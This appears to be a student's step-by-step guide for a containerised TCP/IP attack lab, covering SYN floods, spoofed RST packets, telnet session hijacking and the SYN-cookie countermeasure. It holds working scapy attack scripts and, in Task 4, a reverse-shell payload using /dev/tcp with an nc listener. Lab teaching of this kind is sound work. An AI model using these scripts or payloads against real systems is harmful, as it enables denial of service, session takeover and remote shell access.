# TCP/IP Attack Lab — Step-by-Step Guide

Environment: `docker-compose.yml` with containers:
- `seed-attacker` (attacker)
- `victim-10.9.0.5` (victim, privileged, syncookies off by default)
- `user1-10.9.0.6` (client)
- `user2-10.9.0.7` (client)

General terminal shortcuts (use these instead of `dockps`/`docksh` since your containers have fixed names):

```bash
docker exec -it seed-attacker bash
docker exec -it victim-10.9.0.5 bash
docker exec -it user1-10.9.0.6 bash
docker exec -it user2-10.9.0.7 bash
```

---

## Setup

```bash
cd ~/Downloads/Lab1_TCP
dcdown
dcup -d
```

Open 3–4 terminals:
- **Terminal A** = victim
- **Terminal B** = client (User1 or User2)
- **Terminal C** = attacker

---

## Task 1.1 — SYN Flood Attack Using Python

**1. Check victim state (Terminal A):**
```bash
docker exec -it victim-10.9.0.5 bash
hostname
sysctl -a | grep syncookies      # should be 0
sysctl net.ipv4.tcp_max_syn_backlog
```

**2. Baseline telnet test (Terminal B):**
```bash
docker exec -it user2-10.9.0.7 bash
telnet 10.9.0.5
# login: seed / dees
exit
```
(Use User2 for this baseline so User1 stays "unused" for later fresh tests, or vice versa — just track which client you've already connected from.)

**3. Edit the attack script (Terminal C or from VM):**
```bash
docker exec -it seed-attacker bash
cd /volumes
nano synflood.py
```
Fill in:
```python
ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S')
```
Save and exit.

**4. Clear victim's connection cache (Terminal A):**
```bash
ip tcp_metrics show
ip tcp_metrics flush
```

**5. Shrink the queue (Terminal A):**
```bash
sysctl -w net.ipv4.tcp_max_syn_backlog=8
```

**6. Launch flood — multiple parallel instances (Terminal C):**
```bash
python3 synflood.py &
python3 synflood.py &
python3 synflood.py &
python3 synflood.py &
```

**7. Watch queue fill (Terminal A):**
```bash
watch -n1 "netstat -tna | grep SYN_RECV | wc -l"
```

**8. Test telnet from a client that has NEVER connected before (Terminal B, the other user):**
```bash
docker exec -it user1-10.9.0.6 bash
telnet 10.9.0.5
```
Should hang/fail while flood runs.

**9. Stop the flood (Terminal C):**
```bash
pkill -f synflood.py
```

**Report notes for 1.1:**
- Screenshot the SYN_RECV count while flooding.
- Screenshot the failed telnet attempt.
- Explain: how many parallel instances were needed to succeed, and why (racing against SYN+ACK retransmissions).

---

## Task 1.2 — SYN Flood Attack Using C

**1. Restore queue size on victim (Terminal A):**
```bash
sysctl -w net.ipv4.tcp_max_syn_backlog=128
```

**2. Compile on the VM (not inside a container):**
```bash
cd ~/Downloads/Lab1_TCP
gcc -o synflood synflood.c
# Apple Silicon only:
# gcc -static -o synflood synflood.c
```

**3. Run from attacker (Terminal C):**
```bash
cd /volumes
./synflood 10.9.0.5 23
```

**4. Test telnet from a fresh client**, same as Task 1.1 step 8.

**Report notes for 1.2:**
- Compare: did a single C instance succeed where Python needed several?
- Explain why (C is faster / no interpreter overhead, so it wins the retransmission race more easily).

---

## Task 1.3 — Enable SYN Cookie Countermeasure

**1. Turn cookies on (Terminal A):**
```bash
sysctl -w net.ipv4.tcp_syncookies=1
```

**2. Re-run the attack** (Python and/or C, same steps as above).

**3. Test telnet from a fresh client.**

**Report notes for 1.3:**
- Should now succeed regardless of flood — explain why (SYN cookies avoid storing state in the backlog queue, so the queue can't be exhausted).
- Turn cookies back off afterward if you continue to other tasks: `sysctl -w net.ipv4.tcp_syncookies=0`

---

## Task 2 — TCP RST Attack on Telnet Connections

Goal: break an existing telnet session between two containers by spoofing a RST packet.

**1. Set up an active telnet session:**
- Terminal B (User1): `telnet 10.9.0.6` → wait, that's itself; instead telnet from User1 to User2 or from a user to victim:
```bash
docker exec -it user1-10.9.0.6 bash
telnet 10.9.0.7    # or telnet victim 10.9.0.5, whichever pair you're told to use
```
Keep this session open and idle.

**2. On the attacker, sniff the traffic with Wireshark or tcpdump** to find the live connection's parameters:
```bash
docker exec -it seed-attacker bash
tcpdump -i eth0 tcp port 23 -n
```
Note down: source IP/port, destination IP/port, and a valid sequence number from the ongoing session.

**3. Write the RST spoofing script (`/volumes/rst_attack.py`):**
```python
#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="<client_ip>", dst="<server_ip>")
tcp = TCP(sport=<client_port>, dport=23, flags="R", seq=<seq_no>)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
```
Replace `<client_ip>`, `<server_ip>`, `<client_port>`, `<seq_no>` with real values from your sniffed packet.

**4. Run it:**
```bash
python3 rst_attack.py
```

**5. Check the telnet terminal (Terminal B)** — the session should drop with "Connection closed by foreign host."

**Optional (automated version):** write a sniff-and-spoof script using `scapy.sniff(iface=..., filter="tcp port 23", prn=callback)` that extracts parameters live and sends the RST automatically. Don't forget to set `iface`.

**Report notes for Task 2:**
- Screenshot the live session before attack, the sniffed packet with the seq number you used, and the terminated session after.

---

## Task 3 — TCP Session Hijacking

Goal: inject a malicious command into an existing telnet session without breaking it.

**1. Set up an active telnet session** (same as Task 2 step 1) between two containers, and actually leave it idle after login (don't type anything, so seq/ack numbers stay predictable).

**2. Sniff to find current seq/ack numbers:**
```bash
docker exec -it seed-attacker bash
tcpdump -i eth0 tcp port 23 -n
```

**3. Write the hijacking script (`/volumes/hijack.py`):**
```python
#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="<client_ip>", dst="<server_ip>")
tcp = TCP(sport=<client_port>, dport=23, flags="A", seq=<seq_no>, ack=<ack_no>)
data = "malicious-command-here\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
```
Use a real command as `data`, e.g. `"echo you-are-hacked > /tmp/proof.txt\r"`.

**4. Run it:**
```bash
python3 hijack.py
```

**5. Verify on the victim (Terminal A or wherever telnet server runs):**
```bash
cat /tmp/proof.txt
```
Should show your injected content, proving the command executed inside the hijacked session.

**Report notes for Task 3:**
- Screenshot before/after: the file didn't exist, then it does, without the legitimate user ever typing that command.
- Explain how you derived seq/ack (matching the exact next expected numbers is essential — sniff a packet, use its seq + len(payload) as the next seq).

---

## Task 4 — Reverse Shell via Session Hijacking

Goal: use the hijacking technique from Task 3 to get a reverse shell instead of a one-off command.

**1. Start a listener on the attacker:**
```bash
docker exec -it seed-attacker bash
nc -lnv 9090
```

**2. Modify the hijack script's `data` to a reverse shell command:**
```python
data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
```
(Adjust `10.9.0.1` if your attacker's IP inside the lab network is different — check with `ip addr` on the attacker container, since it's in host mode.)

**3. Run the hijack script** (same seq/ack sniffing process as Task 3):
```bash
python3 hijack.py
```

**4. Check the `nc` listener terminal** — you should see "Connection received" and get a shell prompt running on the victim/target machine.

**5. Prove control:**
```bash
whoami
hostname
```
in the reverse shell, and screenshot the output.

**Report notes for Task 4:**
- Screenshot the nc listener before and after connection.
- Explain each part of the reverse shell command (`-i`, `> /dev/tcp/...`, `0<&1`, `2>&1`) in your own words.

---

## Report Checklist

For each task, include:
1. The exact command/code you used (with your filled-in values, not `@@@@` placeholders).
2. A screenshot showing the attack running.
3. A screenshot showing the result (failed telnet, dropped session, injected file, reverse shell).
4. A short explanation of *why* it worked (or didn't, and what you changed to fix it).
5. For Task 1: your answer to "how many parallel instances were needed" and how backlog size affected success rate.
